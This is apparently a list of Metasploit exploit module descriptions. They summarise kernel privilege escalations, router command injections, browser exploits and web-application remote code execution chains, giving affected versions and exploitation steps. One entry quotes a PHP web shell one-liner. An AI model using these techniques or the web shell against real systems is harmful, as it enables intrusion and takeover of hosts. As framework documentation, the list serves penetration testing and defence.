This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal command under the context of the root user. The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation. But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage. One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.

linux/http/zimbra_xxe_rce
This module exploits an XML external entity vulnerability and a server side request forgery to get unauthenticated code execution on Zimbra Collaboration Suite. The XML external entity vulnerability in the Autodiscover Servlet is used to read a Zimbra configuration file that contains an LDAP password for the 'zimbra' account. The zimbra credentials are then used to get a user authentication cookie with an AuthRequest message. Using the user cookie, a server side request forgery in the Proxy Servlet is used to proxy an AuthRequest with the 'zimbra' credentials to the admin port to retrieve an admin cookie. After gaining an admin cookie the Client Upload servlet is used to upload a JSP webshell that can be triggered from the web server to get command execution on the host. The issues reportedly affect Zimbra Collaboration Suite v8.5 to v8.7.11. This module was tested with Zimbra Release 8.7.1.GA.1670.UBUNTU16.64 UBUNTU16_64 FOSS edition.

This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd) and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices. The remote code execution vulnerability can be exploited by chaining the local file disclosure vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`. With this information disclosure, the attacker can determine if the router is reachable via ssh and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting a weak implementation of a password derivation algorithm using the device serial number. After exploitation, an attacker will be able to execute any command as user `supervisor`.

The bug was initially introduced in 2011 and patched in version 4.10.6, potentially affecting a large number of kernels; however this exploit targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46, including Linux distros based on Ubuntu Xenial, such as Linux Mint. The target system must have unprivileged user namespaces enabled and two or more CPU cores. Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on Linux Mint 18 (x86_64) with kernel versions: 4.8.0-34-generic; 4.8.0-36-generic; 4.8.0-39-generic; 4.8.0-41-generic; 4.8.0-42-generic; 4.8.0-44-generic; 4.8.0-45-generic.

linux/local/apport_abrt_chroot_priv_esc
This module attempts to gain root privileges on Linux systems by invoking the default coredump handler inside a namespace ("container"). Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are vulnerable, due to a feature which allows forwarding reports to a container's Apport by changing the root directory before loading the crash report, causing `usr/share/apport/apport` within the crashed task's directory to be executed. Similarly, Fedora is vulnerable when the kernel crash handler is configured to change root directory before executing ABRT, causing `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be executed. In both instances, the crash handler does not drop privileges, resulting in code execution as root. This module has been tested successfully on Apport 2.14.1 on Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.

linux/local/bpf_sign_extension_priv_esc
Linux kernel prior to 4.14.8 contains a vulnerability in the Berkeley Packet Filter (BPF) verifier.

linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and 5.10.37 are vulnerable to a bug in the eBPF verifier's verification of ALU32 operations in the scalar32_min_max_and function when performing AND operations, whereby under certain conditions the bounds of a 32 bit register would not be properly updated. This can be abused by attackers to conduct an out of bounds read and write in the Linux kernel and therefore achieve arbitrary code execution as the root user. The target system must be compiled with eBPF support and not have kernel.unprivileged_bpf_disabled set, which prevents unprivileged users from loading eBPF programs into the kernel. Note that if kernel.unprivileged_bpf_disabled is enabled this module can still be utilized to bypass protections such as SELinux, however the user must already be logged as a privileged user such as root.

linux/local/cve_2021_3493_overlayfs
This module exploits a vulnerability in Ubuntu's implementation of overlayfs. The vulnerability is the result of failing to verify the ability of a user to set the attributes in a running executable. Specifically, when Overlayfs sends the set attributes data to the underlying file system via `vfs_setxattr`, it fails to first verify the data by calling `cap_convert_nscap`. This vulnerability was patched by moving the call to `cap_convert_nscap` into the `vfs_setxattr` function that sets the attribute, forcing verification every time the `vfs_setxattr` is called rather than trusting the data was already verified.

linux/local/cve_2022_0847_dirtypipe
This exploit targets a vulnerability in the Linux kernel since 5.8, that allows writing of read only or immutable memory. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102. The module exploits this vulnerability by overwriting a suid binary with the payload, executing it, and then writing the original data back. There are two major limitations of this exploit: the offset cannot be on a page boundary (it needs to write one byte before the offset to add a reference to this page to the pipe), and the write cannot cross a page boundary. This means the payload must be less than the page size (4096 bytes).

This module exploits a bug in io_uring leading to an additional put_cred() that can be exploited to hijack credentials of other processes. We spawn SUID programs to get the free'd cred object reallocated by a privileged process and abuse them to create a SUID root binary ourselves that'll pop a shell. The dangling cred pointer will, however, lead to a kernel panic as soon as the task terminates and its credentials are destroyed. We therefore detach from the controlling terminal, block all signals and rest in silence until the system shuts down and we get killed hard, just to cry in vain, seeing the kernel collapse. The bug affected kernels from v5.12-rc3 to v5.14-rc7. More than 1 CPU is required for exploitation. Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic

linux/local/desktop_privilege_escalation
This module steals the user password of an administrative user on a desktop Linux system when it is entered for unlocking the screen or for doing administrative actions using PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password. It exploits the design weakness that there is no trusted channel for transferring the password from the keyboard to the actual password verification against the shadow file (which is running as root since /etc/shadow is only readable to the root user). Both screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under the current user account to query for the password and then pass it to a setuid-root binary to do the password verification. Therefore, it is possible to inject a password stealer after compromising the user account. Since sudo requires only the user password (and not the root password of the system), stealing the user password of an administrative user directly allows escalating to root privileges. Please note, you have to start a handler as a background job before running this exploit since the exploit will only create a shell when the user actually enters the password (which may be hours after launching the exploit). Using exploit/multi/handler with the option ExitOnSession set to false should do the job.

linux/local/glibc_ld_audit_dso_load_priv_esc
This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the LD_AUDIT environment variable when loading setuid executables. This allows loading arbitrary shared objects from the trusted library search path with the privileges of the suid user. This module uses LD_AUDIT to load the libpcprofile.so shared object, distributed with some versions of glibc, and leverages arbitrary file creation functionality in the library constructor to write a root-owned world-writable file to a system trusted search path (usually /lib). The file is then overwritten with a shared object then loaded with LD_AUDIT resulting in arbitrary code execution. This module has been tested successfully on glibc version 2.11.1 on Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386. RHEL 5 is reportedly affected, but untested. Some glibc distributions do not contain the libpcprofile.so library required for successful exploitation.

This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker. glibc `ld.so` versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the `LD_AUDIT` environment variable when loading setuid executables which allows control over the `$ORIGIN` library search path resulting in execution of arbitrary shared objects. This module opens a file descriptor to the specified suid executable via a hard link, then replaces the hard link with a shared object before instructing the linker to execute the file descriptor, resulting in arbitrary code execution. The specified setuid binary must be readable and located on the same file system partition as the specified writable directory. This module has been tested successfully on: glibc 2.5 on CentOS 5.4 (x86_64); glibc 2.5 on CentOS 5.5 (x86_64); glibc 2.12 on Fedora 13 (i386); and glibc 2.5-49 on RHEL 5.5 (x86_64). Some versions of `ld.so`, such as the version shipped with Ubuntu 14, hit a failed assertion in `dl_open_worker` causing exploitation to fail.

linux/local/ptrace_traceme_pkexec_helper
This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but not over an SSH session, as it requires execution from within the context of a user with an active Polkit agent. In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME.

linux/local/sudo_baron_samedit
A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2 through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker controlled library which results in it being loaded with the elevated privileges held by sudo.

This module exploits a chain of vulnerabilities in the Accellion File Transfer appliance. This appliance exposes a UDP service on port 8812 that acts as a gateway to the internal communication bus. This service uses Blowfish encryption for authentication, but the appliance ships with two easy to guess default authentication keys. This module abuses the known default encryption keys to inject a message into the communication bus. In order to execute arbitrary commands on the remote appliance, a message is injected into the bus destined for the 'matchrep' service. This service exposes a function named 'insert_plugin_meta_info' which is vulnerable to an input validation flaw in a call to system(). This provides access to the 'soggycat' user account, which has sudo privileges to run the primary admin tool as root. These two flaws are fixed in update version FTA_8_0_562.

linux/misc/cisco_rv340_sslvpn
This module exploits a stack buffer overflow in the Cisco RV series routers SSL VPN functionality. The default SSL VPN configuration is exploitable, with no authentication required and works over the Internet! The stack is executable and no ASLR is in place, which makes exploitation easier. Successful execution of this module results in a reverse root shell. A custom payload is used as Metasploit does not have ARMLE null free shellcode. This vulnerability was presented by the Flashback Team in Pwn2Own Austin 2021 and OffensiveCon 2022. For more information check the referenced advisory. This module has been tested in firmware versions 1.0.03.15 and above and works with around 65% reliability. The service restarts automatically so you can keep trying until you pwn it. Only the RV340 router was tested, but other RV series routers should work out of the box.

This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726. The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host. This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro + Radek Domanski). This module was updated in November 2020, after a bypass was discovered for the patch TP-Link issued. The new injection technique works on older firmware too.

linux/misc/unidata_udadmin_auth_bypass
This module exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server. This affects versions of UniData prior to 8.2.4 build 3003. This service typically runs as root. It accepts a username of ":local:" and a password in the form of "<username>:<uid>:<gid>", where username and uid must be a valid account, but gid can be anything except 0. This exploit takes advantage of this login account to authenticate as a chosen user and run an arbitrary command (using the built-in OsCommand message).

linux/misc/unidata_udadmin_password_stack_overflow
This modlue exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server, which runs as root. This vulnerability affects UniData versions 8.2.4 build 3003 and earlier (for Linux), but this module specifically targets UniData version 8.2.4 build 3001. Other versions will crash the forked process, but will not otherwise affect the RPC server. The username and password fields are copied to a stack-based buffer using a function that's equivalent to strcpy() (ie, has no bounds checking). Additionally, the password field is encoded in such a way that we can include NUL bytes.

linux/mysql/mysql_yassl_getname
This module exploits a stack buffer overflow in the yaSSL (1.9.8 and earlier) implementation bundled with MySQL. By sending a specially crafted client certificate, an attacker can execute arbitrary code. This vulnerability is present within the CertDecoder::GetName function inside "taocrypt/src/asn.cpp". However, the stack buffer that is written to exists within a parent function's stack frame. NOTE: This vulnerability requires a non-default configuration. First, the attacker must be able to pass the host-based authentication. Next, the server must be configured to listen on an accessible network interface. Lastly, the server must have been manually configured to use SSL. The binary from version 5.5.0-m2 was built with /GS and /SafeSEH. During testing on Windows XP SP3, these protections successfully prevented exploitation. Testing was also done with mysql on Ubuntu 9.04. Although the vulnerable code is present, both version 5.5.0-m2 built from source and version 5.0.75 from a binary package were not exploitable due to the use of the compiler's FORTIFY feature. Although suse11 was mentioned in the original blog post, the binary package they provide does not contain yaSSL or support SSL.

linux/pop3/cyrus_pop3d_popsubfolders
This exploit takes advantage of a stack based overflow. Once the stack corruption has occurred it is possible to overwrite a pointer which is later used for a memcpy. This gives us a write anything anywhere condition similar to a format string vulnerability. NOTE: The popsubfolders option is a non-default setting. I chose to overwrite the GOT with my shellcode and return to it. This defeats the VA random patch and possibly other stack protection features. Tested on gentoo-sources Linux 2.6.16. Although Fedora CORE 5 ships with a version containing the vulnerable code, it is not exploitable due to the use of the FORTIFY_SOURCE compiler enhancement

On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.

This is an exploit for the Poptop negative read overflow. This will work against versions prior to 1.1.3-b3 and 1.1.3-20030409, but I currently do not have a good way to detect Poptop versions. The server will by default only allow 4 concurrent manager processes (what we run our code in), so you could have a max of 4 shells at once. Using the current method of exploitation, our socket will be closed before we have the ability to run code, preventing the use of Findsock.

linux/redis/redis_debian_sandbox_escape
This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The vulnerability was introduced by Debian and Ubuntu Redis packages that insufficiently sanitized the Lua environment. The maintainers failed to disable the package interface, allowing attackers to load arbitrary libraries. On a typical `redis` deployment (not docker), this module achieves execution as the `redis` user. Debian/Ubuntu packages run Redis using systemd with the "MemoryDenyWriteExecute" permission, which limits some of what an attacker can do. For example, staged meterpreter will fail when attempting to use mprotect. As such, stageless meterpreter is the preferred payload. Redis can be configured with authentication or not. This module will work with either configuration (provided you provide the correct authentication details). This vulnerability could theoretically be exploited across a few architectures: i386, arm, ppc, etc. However, the module only supports x86_64, which is likely to be the most popular version.

linux/samba/chain_reply
This exploits a memory corruption vulnerability present in Samba versions prior to 3.3.13. When handling chained response packets, Samba fails to validate the offset value used when building the next part. By setting this value to a number larger than the destination buffer size, an attacker can corrupt memory. Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will cause the header of the input buffer chunk to be corrupted. After close inspection, it appears that 3.0.x versions of Samba are not exploitable. Since they use an "InputBuffer" size of 0x20441, an attacker cannot cause memory to be corrupted in an exploitable way. It is possible to corrupt the heap header of the "InputBuffer", but it didn't seem possible to get the chunk to be processed again prior to process exit. In order to gain code execution, this exploit attempts to overwrite a "talloc chunk" destructor function pointer. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the nx memory protection. NOTE: It is possible to make exploitation attempts indefinitely since Samba forks for user sessions in the default configuration.

The module uses brute force to guess the stackpivot/rop chain or the system() address and redirect flow there in order to bypass NX. The start and stop addresses for brute forcing have been calculated empirically. On the other hand the module provides the StartBrute and StopBrute which allow the user to configure his own addresses.

linux/smtp/apache_james_exec
This module exploits a vulnerability that exists due to a lack of input validation when creating a user. Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload, host, and port before running the exploit. After running the exploit, the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account.

multi/browser/chrome_object_create
This modules exploits a type confusion in Google Chromes JIT compiler. The Object.create operation can be used to cause a type confusion between a PropertyArray and a NameDictionary. The payload is executed within the rwx region of the sandboxed renderer process. This module can target the renderer process (target 0), but Google Chrome must be launched with the --no-sandbox flag for the payload to execute successfully. Alternatively, this module can use CVE-2019-1458 to escape the renderer sandbox (target 1). This will only work on vulnerable versions of Windows (e.g Windows 7) and the exploit can only be triggered once. Additionally the exploit can cause the target machine to restart when the session is terminated. A BSOD is also likely to occur when the system is shut down or rebooted.

multi/browser/chrome_simplifiedlowering_overflow
This module exploits an issue in Google Chrome versions before 87.0.4280.88 (64 bit). The exploit makes use of an integer overflow in the SimplifiedLowering phase in turbofan. It is used along with a type hardening bypass using ArrayPrototypeShift to create a JSArray with a length of -1. This is abused to gain arbitrary read/write into the isolate region. Then an ArrayBuffer can be used to achieve absolute arbitrary read/write. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode. The payload is executed within the sandboxed renderer process, the browser must be run with the --no-sandbox option for the payload to work correctly.

multi/browser/firefox_jit_use_after_free
This modules exploits CVE-2020-26950, a use after free exploit in Firefox. The MCallGetProperty opcode can be emitted with unmet assumptions resulting in an exploitable use-after-free condition. This exploit uses a somewhat novel technique of spraying ArgumentsData structures in order to construct primitives. The shellcode is forced into executable memory via the JIT compiler, and executed by writing to the JIT region pointer. This exploit does not contain a sandbox escape, so firefox must be run with the MOZ_DISABLE_CONTENT_SANDBOX environment variable set, in order for the shellcode to run successfully. This vulnerability affects Firefox < 82.0.3, Firefox ESR < 78.4.1, and Thunderbird < 78.4.2, however only Firefox <= 79 is supported as a target. Additional work may be needed to support other versions such as Firefox 82.0.1.

multi/browser/firefox_proto_crmfrequest
On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given invalid input, would throw an exception that did not have an __exposedProps__ property set. By re-setting this property on the exception object's prototype, the chrome-based defineProperty method is made available. With the defineProperty method, functions belonging to window and document can be overridden with a function that gets called from chrome-privileged context. From here, another vulnerability in the crypto.generateCRMFRequest function is used to "peek" into the context's private scope. Since the window does not have a chrome:// URL, the insecure parts of Components.classes are not available, so instead the AddonManager API is invoked to silently install a malicious plugin.

multi/browser/firefox_svg_plugin
This exploit gains remote code execution on Firefox 17 and 17.0.1, provided the user has installed Flash. No memory corruption is used. First, a Flash object is cloned into the anonymous content of the SVG "use" element in the <body> (CVE-2013-0758). From there, the Flash object can navigate a child frame to a URL in the chrome:// scheme. Then a separate exploit (CVE-2013-0757) is used to bypass the security wrapper around the child frame's window reference and inject code into the chrome:// context. Once we have injection into the chrome execution context, we can write the payload to disk, chmod it (if posix), and then execute. Note: Flash is used here to trigger the exploit but any Firefox plugin with script access should be able to trigger it.

multi/browser/firefox_xpi_bootstrapped_addon
Mozilla Firefox before version 41 allowed users to install unsigned browser extensions from arbitrary web servers. This module dynamically creates an unsigned .xpi addon file. The resulting bootstrapped Firefox addon is presented to the victim via a web page. The victim's Firefox browser will pop a dialog asking if they trust the addon. Once the user clicks "install", the addon is installed and executes the payload with full user permissions. As of Firefox 4, this will work without a restart as the addon is marked to be "bootstrapped". As the addon will execute the payload after each Firefox restart, an option can be given to automatically uninstall the addon once the payload has been executed. As of Firefox 41, unsigned extensions can still be installed on Firefox Nightly, Unbranded and Development builds when configured with `xpinstall.signatures.required` set to `false`. Note: this module generates legacy extensions which are supported only in Firefox before version 57.

The exploit takes advantage of two issues in JDK 7: The ClassFinder and MethodFinder.findMethod(). Both were newly introduced in JDK 7. ClassFinder is a replacement for classForName back in JDK 6. It allows untrusted code to obtain a reference and have access to a restricted package in JDK 7, which can be used to abuse sun.awt.SunToolkit (a restricted package). With sun.awt.SunToolkit, we can actually invoke getField() by abusing findMethod() in Statement.invokeInternal() (but getField() must be public, and that's not always the case in JDK 6) in order to access Statement.acc's private field, modify AccessControlContext, and then disable Security Manager. Once Security Manager is disabled, we can execute arbitrary Java code. Our exploit has been tested successfully against multiple platforms, including: IE, Firefox, Safari, Chrome; Windows, Ubuntu, OS X, Solaris, etc.

multi/browser/msfd_rce_browser
Metasploit's msfd-service makes it possible to get a msfconsole-like interface over a TCP socket. This module connects to the msfd-socket through the victim's browser. To execute msfconsole-commands in JavaScript from a web application, this module places the payload in the POST-data. These POST-requests can be sent cross-domain and can therefore be sent to localhost on the victim's machine. The msfconsole-command to execute code is 'rbi -e "CODE"'. Exploitation when the browser is running on Windows is unreliable and the exploit is only usable when IE is used and the quiet-flag has been passed to msf-daemon.

multi/http/apache_druid_cve_2023_25194
This module is designed to exploit the JNDI injection vulnerability in Druid. The vulnerability specifically affects the indexer/v1/sampler interface of Druid, enabling an attacker to execute arbitrary commands on the targeted server. The vulnerability is found in Apache Kafka clients versions ranging from 2.3.0 to 3.3.2. If an attacker can manipulate the sasl.jaas.config property of any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule, it allows the server to establish a connection with the attacker's LDAP server and deserialize the LDAP response. This provides the attacker with the capability to execute java deserialization gadget chains on the Kafka connect server, potentially leading to unrestricted deserialization of untrusted data or even remote code execution (RCE) if there are relevant gadgets in the classpath. To facilitate the exploitation process, this module will initiate an LDAP server that the target server needs to connect to in order to carry out the attack.

multi/http/atutor_upload_traversal
This module exploits an arbitrary file upload vulnerability together with a directory traversal flaw in ATutor versions 2.2.4, 2.2.2 and 2.2.1 in order to execute arbitrary commands. It first creates a zip archive containing a malicious PHP file. The zip archive takes advantage of a directory traversal vulnerability that will cause the PHP file to be dropped in the root server directory (`htdocs` for Windows and `html` for Linux targets). The PHP file contains an encoded payload that allows for remote command execution on the target server. The zip archive can be uploaded via two vectors, the `Import New Language` function and the `Patcher` function. The module first uploads the archive via `Import New Language` and then attempts to execute the payload via an HTTP GET request to the PHP file in the root server directory. If no session is obtained, the module creates another zip archive and attempts exploitation via `Patcher`. Valid credentials for an ATutor admin account are required. This module has been successfully tested against ATutor 2.2.4 running on Windows 10 (XAMPP server).

multi/http/cve_2021_35464_forgerock_openam
This module leverages a pre-authentication remote code execution vulnerability in the OpenAM identity and access management solution. The vulnerability arises from a Java deserialization flaw in OpenAM’s implementation of the Jato framework and can be triggered by a simple one-line GET or POST request to a vulnerable endpoint. Successful exploitation yields code execution on the target system as the service user. This vulnerability also affects the ForgeRock identity platform which is built on top of OpenAM and is thus is susceptible to the same issue.

multi/http/dexter_casinoloader_exec
This module exploits a vulnerability found in the command and control panel used to control Dexter (Point of Sale malware). This is done by accessing the PHP page used by bots to report in (gateway.php) which does not sanitize input. Input is encrypted and encoded, but the key is supplied by the bot connecting. The 'page' parameter is used in this case. The command and control panel designates a location to upload files, and can be used as a reliable location to write a PHP shell. Authentication is not needed to exploit this vulnerability.

multi/http/dotcms_file_upload_rce
When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the file down in a temp directory. In the case of this vulnerability, dotCMS does not sanitize the filename passed in via the multipart request header and thus does not sanitize the temp file's name. This allows a specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content) that get written outside of the dotCMS temp directory. In the case of this exploit, an attacker can upload a special .jsp file to the webapp/ROOT directory of dotCMS which can allow for remote code execution.

multi/http/drupal_drupageddon
This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32). Two methods are available to trigger the PHP payload on the target: - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal's cache, then trigger the cache entry to execute the payload using a POP chain. - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group, enable Drupal's PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution.

On operating systems which have case-insensitive file systems, like Windows and OS X, Git clients can be convinced to retrieve and overwrite sensitive configuration files in the .git directory which can allow arbitrary code execution if a vulnerable client can be convinced to perform certain actions (for example, a checkout) against a malicious Git repository. A second vulnerability with similar characteristics also exists in both Git and Mercurial clients, on HFS+ file systems (Mac OS X) only, where certain Unicode codepoints are ignorable. The third vulnerability with similar characteristics only affects Mercurial clients on Windows, where Windows "short names" (MS-DOS-compatible 8.3 format) are supported. Today this module only truly supports the first vulnerability (Git clients on case-insensitive file systems) but has the functionality to support the remaining two with a little work.

multi/http/gitea_git_hooks_rce
This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gitea. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gitea web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. It has been mitigated in version 1.13.0 by setting the Gitea `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This disables this feature and prevents all users (including admin) from creating custom git hooks. This module has been tested successfully against docker versions 1.12.5, 1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on version 1.12.6 on Windows.

multi/http/horizontcms_upload_exec
This module exploits an arbitrary file upload vulnerability in HorizontCMS 1.0.0-beta in order to execute arbitrary commands. The module first attempts to authenticate to HorizontCMS. It then tries to upload a malicious PHP file via an HTTP POST request to `/admin/file-manager/fileupload`. The server will rename this file to a random string. The module will therefore attempt to change the filename back to the original name via an HTTP POST request to `/admin/file-manager/rename`. For the `php` target, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to `/storage/file_name`. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET["cmd"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell. Valid credentials for a HorizontCMS user with permissions to use the FileManager are required. This would be all users in the Admin, Manager and Editor groups if HorizontCMS is configured with the default group settings.This module has been successfully tested against HorizontCMS 1.0.0-beta running on Ubuntu 18.04.

multi/http/jenkins_metaprogramming
This module exploits a vulnerability in Jenkins dynamic routing to bypass the Overall/Read ACL and leverage Groovy metaprogramming to download and execute a malicious JAR file. When the "Java Dropper" target is selected, the original entry point based on classLoader.parseClass is used, which requires the use of Groovy metaprogramming to achieve RCE. When the "Unix In-Memory" target is selected, a newer, higher-level, and more universal entry point based on GroovyShell.parse is used. This permits the use of in-memory arbitrary command execution. The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work on later versions of Jenkins. Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.

multi/http/jira_hipchat_template
Atlassian Hipchat is a web service for internal instant messaging. A plugin is available for Jira that allows team collaboration at real time. A message can be used to inject Java code into a Velocity template, and gain code execution as Jira. Authentication is required to exploit this vulnerability, and you must make sure the account you're using isn't protected by captcha. By default, Java payload will be used because it is cross-platform, but you can also specify which native payload you want (Linux or Windows). HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with a vulnerable copy of HipChat. When using the check command, if you supply a valid username and password, the module will be able to trigger the bug and check more accurately. If not, it falls back to passive, which can only tell if the target is running on a Jira version that is bundled with a vulnerable copy of Hipchat by default, which is less reliable. This vulnerability was originally discovered internally by Atlassian.

multi/http/joomla_http_header_rce
Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13. In later versions the deserialisation of invalid session data stops on the first error and the exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and 5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.

Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration, log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints. This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that will trigger an LDAP connection to Metasploit and load a payload. The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP server in addition to the LDAP server that the target can connect to. The targeted application must have the trusted code base option enabled for this technique to work. The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.

The SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older or upgraded builds). MySQL targets are more reliable due to the use of relative paths; with PostgreSQL you should find the web root path via other means and specify it with WEB_ROOT. The injection is only exploitable via a GET request, which means that the payload has to be sent in chunks smaller than 8000 characters (URL size limitation). Small payloads and the use of exe-small is recommended, as you can only do between 10 and 20 injections before using up all the available ManagedConnections until the next server restart. This vulnerability exists in all versions released since 2006, however builds below DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler. You can still try your luck using the MySQL targets as a JDK might be installed in the $PATH.

multi/http/manageengine_auth_upload
This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk, AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts the upload does not handle correctly '../' sequences, which can be abused to write to the file system. Authentication is needed to exploit this vulnerability, but this module will attempt to login using the default credentials for the administrator and guest accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password. For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer, SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been tested successfully in Windows and Linux on several versions.

multi/http/maracms_upload_exec
